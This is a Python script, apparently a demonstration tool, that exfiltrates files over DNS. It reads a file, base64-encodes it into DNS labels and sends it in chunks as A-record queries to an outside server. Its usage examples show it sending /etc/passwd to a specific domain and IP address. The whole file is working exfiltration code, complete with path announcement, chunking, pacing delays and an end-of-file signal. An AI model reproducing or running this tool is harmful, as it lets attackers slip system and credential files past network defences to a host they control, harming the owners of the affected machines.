#!/usr/bin/env python3
"""
DNS-based file exfiltration client (pure dnslib)

Usage:
• With explicit IP:
    python3 dns_exfil_client.py /etc/passwd 52.56.139.78 dnsdemo.andrewrea.co.uk
• Auto-resolve from domain:
    python3 dns_exfil_client.py /etc/passwd dnsdemo.andrewrea.co.uk
"""

import argparse, base64, os, socket, time, traceback
from typing import Optional, List
from dnslib import DNSRecord, QTYPE

MAX_LABEL = 63
CHUNK     = 30  # bytes per DNS chunk

# ────────────────────────── utilities
def to_labels(data: bytes, max_len: int = MAX_LABEL) -> List[str]:
    b64 = base64.urlsafe_b64encode(data).decode().rstrip("=")
    return [b64[i:i+max_len] for i in range(0, len(b64), max_len)]

def validate(qname: str) -> None:
    for label in qname.split("."):
        if len(label) > MAX_LABEL:
            raise ValueError(f"Label too long: {label}")

# DNS A/NS resolution using dnslib
def _resolve_first(name: str, rtype: str) -> Optional[str]:
    try:
        q = DNSRecord.question(name, qtype=rtype)
        raw = q.send("8.8.8.8", 53, timeout=2)
        for rr in DNSRecord.parse(raw).rr:
            if QTYPE[rr.rtype] == rtype:
                return str(rr.rdata)
    except Exception as e:
        print(f"[!] DNS {rtype} lookup failed for {name}: {e}")
    return None

def resolve_ip(domain: str) -> Optional[str]:
    print(f"[DEBUG] Resolving {domain}")
    ip = _resolve_first(domain, "A")
    if ip:
        print(f"[DEBUG] Resolved A {domain} → {ip}")
        return ip

    ns = _resolve_first(domain, "NS")
    if ns:
        ip = _resolve_first(ns.rstrip("."), "A")
        if ip:
            print(f"[DEBUG] via NS {ns} → {ip}")
            return ip

    print("[!] No usable A/NS glue")
    return None

# ────────────────────────── send DNS query to IP
def send(qname: str, server_ip: str) -> None:
    try:
        validate(qname)
        pkt = DNSRecord.question(qname, qtype="A").pack()
        addr = (server_ip, 53)
        print(f"[DEBUG] Sending to {server_ip} → {qname}")

        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.settimeout(2)
            s.sendto(pkt, addr)

    except Exception as e:
        print(f"[!] Send failed to {server_ip} for {qname}: {e}")
        traceback.print_exc()

# ────────────────────────── main logic
def exfil(file_path: str,
          srv_or_dom: str,
          dom: Optional[str],
          delay: float) -> None:

    if dom is None:
        domain     = srv_or_dom
        server_ip  = resolve_ip(domain)
        if not server_ip:
            print("[!] Abort: cannot resolve domain")
            return
    else:
        server_ip  = srv_or_dom
        domain     = dom

    print(f"[✓] Resolved target → {server_ip}")
    if not os.path.isfile(file_path):
        print(f"[!] File not found: {file_path}")
        return

    data = open(file_path, "rb").read()

    # 1️⃣ path announcement
    path_token = file_path.strip("/").replace("/", "_")
    send(f"path.{path_token}.{domain}", server_ip)
    time.sleep(delay)

    # 2️⃣ chunked transfer
    chunks = [data[i:i+CHUNK] for i in range(0, len(data), CHUNK)]
    for idx, chunk in enumerate(chunks):
        qname = ".".join(to_labels(chunk) + [str(idx), domain])
        print(f"[+] chunk {idx}/{len(chunks)-1}")
        send(qname, server_ip)
        time.sleep(delay)

    # 3️⃣ eof
    send(f"eof.{domain}", server_ip)
    print(f"[✓] Sent {len(chunks)} chunks → {server_ip}")

# ────────────────────────── CLI entry
if __name__ == "__main__":
    ap = argparse.ArgumentParser(description="dnslib exfil client")
    ap.add_argument("file")
    ap.add_argument("server_or_domain")
    ap.add_argument("domain", nargs="?", help="base domain (omit to auto-resolve)")
    ap.add_argument("--delay", type=float, default=0.1)
    args = ap.parse_args()
    exfil(args.file, args.server_or_domain, args.domain, args.delay)

